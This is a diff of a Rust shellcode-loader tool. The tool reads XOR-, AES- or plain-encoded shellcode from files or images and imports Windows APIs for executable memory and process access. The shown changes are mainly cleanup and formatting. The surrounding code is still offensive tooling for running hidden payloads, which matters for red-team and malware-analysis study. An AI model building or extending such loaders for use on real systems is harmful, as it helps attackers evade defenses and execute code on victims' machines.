@@ -4,17 +4,16 @@ use mmap_fixed::MapOption::*;
 use std::fs::OpenOptions;
 use std::io::Write;
 use std::mem;
-
-extern crate kernel32;
 use std::ptr;
 
+#[cfg(windows)]
+extern crate kernel32;
 #[cfg(windows)]
 use winapi::um::winnls::{EnumSystemGeoID, GEO_ENUMPROC};
 #[cfg(windows)]
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
 
 use bstr::ByteSlice;
-
 use serde_derive::{Deserialize, Serialize};
 
 use aes_gcm::{
@@ -47,19 +46,17 @@ pub struct AESShellCode {
 }
 
 const SHELLCODE_EGG_THING: &[u8] =
-    b"you mirin mah shellcode brah? rust land best lang, c is for nerds";
+    b"you mirin mah shellcode brah? rust lang best lang, c is for nerds";
 
 impl ShellCode {
     pub fn from_file(input_path: &str) -> ShellCode {
-        let sc_object = match ShellCode::import_sc(input_path, "xor") {
+        match ShellCode::import_sc(input_path, "xor") {
             Ok(my_xor_object) => my_xor_object,
             Err(_) => match ShellCode::import_sc(input_path, "aes") {
                 Ok(my_aes_object) => my_aes_object,
                 Err(_) => ShellCode::import_sc(input_path, "plain").unwrap(),
             },
-        };
-
-        sc_object
+        }
     }
 
     pub fn from_image(input_path: &str) -> ShellCode {
@@ -117,7 +114,7 @@ impl ShellCode {
         }
     }
 
-     fn import_sc_image(deserialized_sc: Vec<u8>, mode: &str) -> anyhow::Result<ShellCode> {
+    fn import_sc_image(deserialized_sc: Vec<u8>, mode: &str) -> anyhow::Result<ShellCode> {
         match mode {
             "xor" => {
                 println!("[+] la recette des biscuits à l'érable dectected as XOR encrypted");
